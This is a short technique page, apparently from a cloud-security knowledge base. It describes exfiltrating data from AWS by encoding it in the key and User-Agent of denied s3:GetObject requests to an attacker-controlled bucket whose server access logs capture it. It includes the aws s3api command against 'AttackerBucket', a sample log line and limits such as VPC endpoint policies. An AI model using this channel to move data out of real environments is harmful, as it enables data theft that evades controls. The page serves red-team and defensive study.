---
author_name: Costas Kourmpoglou
title: S3 Server Access Logs 
description: Exfiltrate data via S3:GetObject and s3 server access logs
hide:
  - toc
---

Related Reading: [https://airwalkreply.com/cloud-services-as-exfiltration-mechanisms](https://airwalkreply.com/cloud-services-as-exfiltration-mechanisms)

If we have control over an IAM identity that allows `s3:GetObject`, depending on the network access to the S3 service, we can use S3 server access logs to a bucket _we_ control, and use it to exfiltrate data.

We'll create an S3 bucket, `AttackerBucket` in our account with [server access logging](https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html).
Let's name the logging bucket `AttackerBucketLogs`. Every request to the S3 bucket, will be logged in this bucket. This includes internal AWS requests, or requests made via the AWS console.

With our data in hand `ExampleDataToExfiltrate`, we will send a `GetObject` request to our bucket, for example:

`aws s3api get-object --bucket AttackerBucket  --key ExampleDataToExfiltrate`

The request will be denied. However the attempt along with the other details, including our key `ExampleDatatoExfiltrate` - which is the data we're exfiltrating -  will arrive to our logging bucket `AttackerBucketLogs`.

We'll receive the data in the default logging format:

```
[..] attackerbucket […] 31.94.19.179 – […] REST.GET.OBJECT ExampleDataToExfiltrate "GET / ExampleDataToExfiltrate HTTP/1.1" 403 AccessDenied 243 - 18 - "-" "UserAgentAlsoHasData " – […]
```


We're exfiltrating data, using the Key parameter of the request. There's a hard limit of 1024 bytes per Key, but other request fields can be used like User-Agent.

There are two challenges with this method:

1. If the network access to the S3 service takes place over a VPC endpoint, then the policy of the VPC endpoint would need to allow access to our bucket.
The VPC endpoint will drop the request and will not forward it to the S3 service, if the policy doesn't allow it. The S3 service won't be able to generate logs, and we won't be able to exfiltrate data.

2. The logs are not guaranteed to arrive in order. If you're splitting data across multiple requests, you'll need to figure out a mechanism to re-order the data correctly.  

 
For the general usecase where network access to the S3 service takes place over the internet, there is a 10-120 minute delay, in the log delivery.
